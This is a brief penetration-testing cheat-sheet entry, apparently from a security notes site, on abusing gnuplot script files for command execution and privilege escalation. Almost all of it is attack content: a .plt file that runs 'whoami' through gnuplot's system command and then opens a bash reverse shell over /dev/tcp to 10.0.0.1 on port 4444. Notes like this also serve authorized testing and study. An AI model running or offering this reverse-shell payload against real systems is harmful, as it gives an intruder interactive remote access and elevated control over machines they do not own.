---
title: Gnuplot Privilege Escalation
description: gnuplot is a command-line and GUI program that can generate two- and three-dimentional plots of functions, data, and data fits.
tags:
    - Linux
    - Privilege Escalation
refs:
    - http://gnuplot.info/docs_5.5/loc18483.html
date: 2023-06-19
draft: false
---

## Command Execution

The script file of **`gnuplot`** can be used to execute system commands as below.

```bash
gnuplot test.plt
```

Contents of the **`.plt`** is like the following.

```bash
system "whoami"

# Reverse shell
system "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
```
